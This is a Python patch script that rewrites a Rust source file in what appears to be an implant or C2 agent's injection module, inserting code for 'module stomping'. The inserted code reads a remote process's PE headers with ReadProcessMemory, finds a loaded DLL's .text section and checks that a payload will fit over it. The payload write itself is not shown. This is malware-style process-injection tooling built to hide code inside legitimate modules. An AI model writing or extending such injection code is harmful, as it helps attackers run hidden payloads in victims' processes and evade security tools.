import re

with open("agent/src/injection/module_stomp.rs", "r") as f:
    c = f.read()

new_stomp = """
            // Real PE parsing for Module Stomping remotely
            use winapi::um::memoryapi::ReadProcessMemory;
            use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER, IMAGE_FIRST_SECTION};
            use std::mem::size_of;

            let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
            let mut bytes_read = 0;
            if ReadProcessMemory(h_proc, target_base as _, &mut dos_header as *mut _ as _, size_of::<IMAGE_DOS_HEADER>(), &mut bytes_read) == 0 {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to read remote DOS header"));
            }

            if dos_header.e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
                CloseHandle(h_proc);
                return Err(anyhow!("Invalid DOS signature"));
            }

            // We must read NT headers. Assuming x86_64 target for simplicity, but let's just read fields.
            // Actually, we can read the signature and FileHeader first, but IMAGE_NT_HEADERS64 is standard for 64-bit target.
            #[cfg(target_arch = "x86_64")]
            type NtHeaders = IMAGE_NT_HEADERS64;
            #[cfg(target_arch = "x86")]
            type NtHeaders = IMAGE_NT_HEADERS32;

            let mut nt_headers: NtHeaders = std::mem::zeroed();
            let nt_headers_addr = (target_base as usize + dos_header.e_lfanew as usize) as *mut _;
            if ReadProcessMemory(h_proc, nt_headers_addr, &mut nt_headers as *mut _ as _, size_of::<NtHeaders>(), &mut bytes_read) == 0 {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to read remote NT headers"));
            }

            if nt_headers.Signature != winapi::um::winnt::IMAGE_NT_SIGNATURE {
                CloseHandle(h_proc);
                return Err(anyhow!("Invalid NT signature"));
            }

            let mut text_rva = 0;
            let mut text_size = 0;

            let section_offset = (target_base as usize + dos_header.e_lfanew as usize + 
                std::mem::offset_of!(NtHeaders, OptionalHeader) + 
                nt_headers.FileHeader.SizeOfOptionalHeader as usize) as *const _;

            let mut current_section_addr = section_offset as usize;

            for _ in 0..nt_headers.FileHeader.NumberOfSections {
                let mut section: IMAGE_SECTION_HEADER = std::mem::zeroed();
                if ReadProcessMemory(h_proc, current_section_addr as _, &mut section as *mut _ as _, size_of::<IMAGE_SECTION_HEADER>(), &mut bytes_read) == 0 {
                    break;
                }

                let name = String::from_utf8_lossy(&section.Name);
                if name.starts_with(".text") {
                    text_rva = section.VirtualAddress;
                    // Usually Misc.VirtualSize
                    text_size = unsafe { *section.Misc.VirtualSize() };
                    break;
                }
                current_section_addr += size_of::<IMAGE_SECTION_HEADER>();
            }

            if text_rva == 0 {
                CloseHandle(h_proc);
                return Err(anyhow!("Failed to find .text section"));
            }

            if payload.len() > text_size as usize {
                CloseHandle(h_proc);
                return Err(anyhow!("Payload larger than target .text section"));
            }

            let target_addr = (target_base as usize + text_rva as usize) as *mut winapi::ctypes::c_void;
"""

# replace the stub with the real PE parsing implementation
c = re.sub(
    r"// To stomp, we write our payload over the \.text section of the DLL\..*?let target_addr = \(target_base as usize \+ 0x1000\) as \*mut winapi::ctypes::c_void;", 
    new_stomp, 
    c, 
    flags=re.DOTALL
)

with open("agent/src/injection/module_stomp.rs", "w") as f:
    f.write(c)

